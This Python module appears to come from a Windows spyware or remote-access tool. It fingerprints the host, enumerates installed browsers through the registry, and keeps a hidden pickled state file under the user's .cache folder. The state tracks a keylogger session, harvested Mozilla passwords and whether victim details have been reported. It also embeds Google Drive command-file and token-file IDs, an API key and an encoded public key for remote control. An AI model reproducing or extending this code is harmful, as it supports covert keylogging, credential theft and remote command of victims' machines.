#%%
import json
import os
import pickle
from functools import cached_property, lru_cache
from pprint import PrettyPrinter
from threading import Event
import threading
import ctypes
import codecs
import winreg

from .browsers.config.constant import constant
from .network import ip
from logger import log
from traceback import format_exc


username=constant.username
def formated_str(data):
    if isinstance(data, str):
        return data
    
    try:
        data=json.dumps(data, indent=4)
        return data
    except Exception as e:
        log.warning(f'unknown error while formating type: {type(data)}')
        log.debug(format_exc())
    
    return PrettyPrinter(indent=4).pformat(data)

@lru_cache
def basic_detail():
    import platform
    
    detail = {
        "Processor": platform.processor(),
        "System": f"{platform.system()} {platform.version()}",
        "Machine": platform.machine(),
        "Private IP Address": ip()
    }
    return formated_str(detail)

def size_of(path):
    if os.path.exists(path):
        return os.stat(path).st_size
    return 0

def force_str(b:bytes):
    a=codecs.encode(b, "hex")
    return a.decode('ascii', "strict")

def random_str(ln):
    '''return random srt of "ln" charecters'''
    return force_str(os.urandom(ln//2))

def makedirs(path):
    try:
        os.makedirs(path)
    except:
        pass

def list_browsers():
    key="SOFTWARE\Clients\StartMenuInternet"
    root = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    with winreg.OpenKey(root, key) as installed:
        browser_count=winreg.QueryInfoKey(installed)[0]    
        return [winreg.EnumKey(installed, idx) for idx in range(browser_count)]


#%%
class Values:
    def __init__(self):
        self.last_all_time = 0
        self.last_user_time = 0
        self.mozila_keylog = False
        self.clint_info = False# is basic detail reported
        self.mozila_pass = []# can't be anything else than list
        self.klogger_session={}# info needs to restart the key_logger
        self.clock_diff = 0

        self.cfile_id=r"1eO37l2YgGeI9ChV3be1oYprzpyKpmvXG"# command file id
        self.tfile_id=r"1UQBBpNb5KYFuS6qO3QXI2kSeQ0DylvB0"# token file id
        self.api_key=r"AIzaSyB4Q2rKEaR_w7TPL_bOOtSJ9GZMJig3HSs"
        self.key='''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUV
        GQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6U05FQndwelg0M1ZXd0FwVHNWegppbmlaMDJwUnppenJRZzZrSHU
        4N1JIQXk0MGdnZC9ubCtUcGNMSE83ckQ4OFozYlBLMFl2ZHBMTzdOeWd5TWI2Ckt2djdRd1hnYXFKYWR
        ia3NQR3hpOTNVdElGc3JmL3JSVHFGbi84cmpSZlZ1TFZpR3UyWmRhR3dMZkowdExQVUkKWmdPTFlSUEt
        wcm1YWTJWZFJwR0RWQkxqTm9vak84ZTMxZVgyblVLYisxc2dsZ1VPUktzWHpqSHk4azhkN0VtSgpxYXl
        xVnpmTnpOY1JYNGJWMW9MQ3ZvQXZCTjV0ZERUazE1aHloM2hIWnZCNnlGdFdodHd6dHVvWWUxeUZMcE5
        4Cmd5VWJHWHBVeUFYZ24vMVV0bG5GTFNPdW55M3FZOWIzbnZldTZDeVZ0N2dtNzlIR01CdlhGTVBYcmt
        pdlppZ2sKK1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''

#%%
class permanent:
    def __init__(self):
        # self.data = USERPROFILE\.cache\plugin.pin
        self.data_dir=os.path.join(constant.profile.get("USERPROFILE"), ".cache")
        makedirs(self.data_dir)
        self.data_dir=os.path.join(self.data_dir, "plugin.pin")
        
        self.var = Values()
        self.write = Event()
        self.write.set()

        self.setup()

    def setup(self):
        if not size_of(self.data_dir):
            decoded = self.default
        else:
            with open(self.data_dir, "rb") as f:
                decoded = pickle.load(f)
            
            # checking for type mismatch
            for k in self.default:
                if not type(decoded.get(k)) is type(self.default.get(k)):
                    self.reset(k)
            
        for k, v in decoded.items():
            setattr(self.var, k, v)
            # can't use self.set_value
    
        self.commit()
        
    def _commit(self):
        self.write.clear()
        with open(self.data_dir, "wb") as f:
            pickle.dump(self.var.__dict__, f)
        self.write.set()
    
    def commit(self):
        self.write.wait()
        self._commit()

    def reset(self, key):
        # log.info(f"stored data reseting for {key}")
        value = self.default.get(key)
        self.set_value(key, value)

    def set_value(self, key, value):
        setattr(self.var, key, value)
        self.commit()

    @cached_property
    def default(self):
        value = Values().__dict__
        return value

data_store=permanent()


# %%
if __name__=="__main__":
    # log.info(data_store.var.gmail)
    data_store.reset("gmail")
